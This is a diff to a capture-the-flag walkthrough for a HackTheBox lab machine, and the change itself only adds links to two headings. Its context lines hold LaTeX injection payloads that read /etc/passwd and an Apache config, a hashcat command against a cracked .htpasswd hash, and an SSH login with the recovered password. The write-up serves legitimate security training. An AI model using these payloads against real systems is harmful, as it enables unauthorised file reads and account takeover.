@@ -33,7 +33,7 @@ feroxbuster -u http://10.10.11.217 -x html
 $\lstinputlisting{/etc/passwd}$
 ```
 
-### Apache vhost + .htpasswd Enumeration
+### [Apache vhost + .htpasswd Enumeration](HTTP)
 ```latex
 # View vhost config
 $\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$
@@ -54,7 +54,7 @@ echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > vdaisley.hash
 hashcat -m 1600 -a 0 vdaisley.hash /opt/rockyou.txt
 ```
 
-### SSH Access
+### [SSH](SSH) Access
 ```bash
 sshpass -p 'calculus20' ssh vdaisley@topology.htb
 ```
